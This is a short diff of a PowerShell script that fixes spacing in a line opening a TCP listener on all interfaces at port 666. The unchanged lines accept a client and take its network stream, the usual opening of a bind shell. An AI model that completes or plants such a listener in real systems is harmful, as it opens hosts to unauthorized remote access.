@@ -1,4 +1,4 @@
-$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',666);
+$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',666);
 $listener.start();
 $client = $listener.AcceptTcpClient();
 $stream = $client.GetStream();
